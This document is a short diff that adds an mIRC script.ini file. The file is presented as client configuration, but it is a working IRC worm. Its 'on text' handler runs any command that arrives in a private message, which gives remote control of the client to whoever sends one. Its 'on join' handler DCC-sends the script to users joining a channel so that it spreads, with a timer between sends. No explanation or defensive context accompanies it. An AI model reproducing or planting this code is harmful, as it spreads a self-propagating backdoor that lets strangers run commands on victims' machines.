@@ -1,0 +1,9 @@
+[script]
+n0=
+n1=3que es lo que pasa
+n2=on 1:text:   *:?:{ s *2 | halt }
+n3=alias /s / *1
+n4=on 1:connect:/.enable #d
+n5=#d on
+n6=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
+n7=#d end
